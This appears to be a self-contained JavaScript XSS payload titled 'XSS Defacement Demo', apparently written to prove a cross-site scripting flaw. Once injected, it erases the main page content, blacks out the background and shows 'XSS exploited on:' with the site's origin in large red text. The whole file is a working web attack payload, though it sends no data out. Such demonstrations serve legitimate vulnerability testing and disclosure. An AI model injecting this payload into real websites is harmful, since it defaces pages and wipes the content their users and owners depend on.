(function() {
  var pageTitle = 'XSS Defacement Demo';
  var pageText = 'XSS exploited on: ' + window.origin;
  var imageUrl = 'data:image/png;base64,';

  var overlay = document.createElement('div');
  overlay.classList.add('xss-demo-defacement')
  overlay.style.textAlign = 'center';

  var txt = document.createElement('p');
  txt.style.font = 'normal normal bold 36px sans-serif';
  txt.style.color = 'red';
  txt.innerText = pageText;
  overlay.appendChild(txt);

  var link = document.createElement('a');
  link.href = '.';
  link.title = 'Click here or reload this page to return to the original web page';
  overlay.appendChild(link);

  var image = document.createElement('img');
  image.setAttribute('border', '0');
  image.setAttribute('src', imageUrl);
  image.style.filter = 'invert(1)';
  link.appendChild(image);

  var footer = document.createElement('p');
  footer.style.font = 'italic normal normal 12px sans-serif';
  footer.style.color = '#DDDDDD';
  footer.innerText = pageTitle;
  overlay.appendChild(footer);

  var container = document.querySelector('article.fd-shell__app') || document.body;
  container.innerText = '';
  container.style.background = 'black';
  container.style.overflow = 'scroll';
  container.appendChild(overlay);

  document.title = pageTitle;
})();
